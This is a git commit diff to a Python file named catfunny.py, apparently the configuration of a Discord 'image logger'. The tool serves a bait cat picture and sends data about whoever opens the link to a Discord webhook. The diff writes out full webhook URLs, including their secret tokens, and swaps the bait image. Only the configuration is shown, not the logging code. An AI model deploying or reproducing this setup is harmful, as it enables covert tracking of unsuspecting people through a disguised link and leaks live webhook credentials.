8af4ff40d27ef5f48bc80179d3f2e7e8d52e244b
MyCatIsKindaFat <finleyflanagin@gmail.com>
2025-06-07 00:23:25 -0400

    Update catfunny.py

--- api/catfunny.py
+++ api/catfunny.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1380763514452447272/ZTAB0aXgmeL3wWKOuJ1upyj88iCQe9q7xDtB2rVcCMTeHmzIX9YHGd3oSCW8APgNTe8w",
+    "image": "https://i.pinimg.com/736x/ba/92/7f/ba927ff34cd961ce2c184d47e8ead9f6.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
